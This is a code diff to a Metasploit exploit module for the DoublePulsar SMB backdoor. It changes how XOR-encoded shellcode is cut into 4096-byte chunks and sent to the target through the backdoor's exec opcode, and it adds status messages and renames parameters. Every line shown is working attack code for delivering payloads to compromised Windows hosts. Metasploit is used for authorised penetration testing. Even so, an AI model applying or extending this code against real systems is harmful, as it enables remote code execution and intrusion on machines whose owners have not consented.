@@ -210,14 +210,17 @@ class MetasploitModule < Msf::Exploit::Remote
 	#loop through buffer sending chunks of 4096 bytes until last packet
 	until times == iterations do
 		#break if times == iterations
-      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], xor_shellcode, 4096, offset)
+		copied_bytes = xor_shellcode[offset, 4096]
+      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, 4096, offset)
 		offset += 4096
 		bytes_left -= 4096
 		times += 1
+		print_status("Sent a Packet!")
 	end 
 	if remainder > 0
 		#last packet here
-		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], xor_shellcode, bytes_left, offset)
+		copied_bytes = xor_shellcode[offset, bytes_left]
+		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, bytes_left, offset)
 	else
 		print_status("DONE!")
     	end
@@ -388,12 +391,12 @@ class MetasploitModule < Msf::Exploit::Remote
     pkt.to_s
   end
 
-  def generate_exec_doublepulsar_param(op, body, chunk_size, offset)
+  def generate_exec_doublepulsar_param(op, body, chunk, payload_offset)
     case OPCODES.key(op)
     when :ping, :kill
       "\x00" * 12
     when :exec
-      Rex::Text.xor([@xor_key].pack('V'), [body.length, chunk_size, offset].pack('V*'))
+      Rex::Text.xor([@xor_key].pack('V'), [body.length, chunk, payload_offset].pack('V*'))
     end
   end
 
